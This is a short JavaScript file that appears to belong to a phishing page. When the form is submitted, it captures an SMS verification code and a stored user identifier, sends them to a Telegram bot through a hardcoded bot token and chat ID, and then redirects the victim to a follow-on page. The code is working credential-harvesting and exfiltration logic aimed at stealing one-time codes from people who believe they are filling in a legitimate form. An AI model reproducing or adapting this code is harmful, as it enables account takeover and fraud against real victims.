var sms = document.getElementById('sms'); // Corrected ID to 'sms'
var usercode = localStorage.getItem('usercode');

document.getElementById('form7').addEventListener('submit', function (e) {
    e.preventDefault();
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

    try {
        bot.sendMessage('👔User : ' + usercode + '💌sms3 : ' + sms.value) // Corrected variable to 'sms'
            .then(res => {
                console.log(res);
                window.location.href = './effectuer.html';
            });
    } catch (err) {
        console.log(err);
    }
});